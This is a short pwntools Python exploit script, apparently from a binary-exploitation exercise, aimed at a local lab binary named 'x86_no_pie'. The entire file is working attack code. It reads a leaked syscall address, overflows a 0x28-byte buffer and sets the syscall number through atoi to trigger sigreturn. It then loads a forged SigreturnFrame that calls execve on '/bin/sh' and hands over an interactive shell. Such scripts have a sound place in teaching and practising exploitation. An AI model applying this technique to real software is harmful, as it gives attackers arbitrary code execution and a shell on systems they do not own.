from pwn import *


binary = "../x86_binaries/x86_no_pie"
elf = context.binary = ELF(binary, checksec=False)

gs = """
break main
continue
"""

if args.GDB:
    context.terminal = ["tmux", "splitw", "-h", "-l", "65%"]
    p = gdb.debug(binary, gdbscript=gs)
else:
    p = elf.process()



### EXPLOIT ###
SYSCALL_SIGRET = 0xf
SS = (str(SYSCALL_SIGRET)+'\x00').encode()

syscall_addr = int(p.readline().strip(),16)+4
print(f'syscall(): {hex(syscall_addr)}')

frame = SigreturnFrame()
frame.rax = 59                              # syscall: execve
frame.rdi = next(elf.search(b'/bin/sh'))    # filename: "/bin/sh"
frame.rsi = 0                               # argv: NULL
frame.rdx = 0                               # envp: NULL
frame.rip = syscall_addr                    # next instruction: syscall

payload = flat(
    SS,                                     # atoi() input to control $rax
    b'a'*(0x28-len(SS)),                    # padding
    p64(syscall_addr),                      # go to syscall instruction
    bytes(frame)                            # sigreturn frame
)
p.sendline(payload)
p.interactive()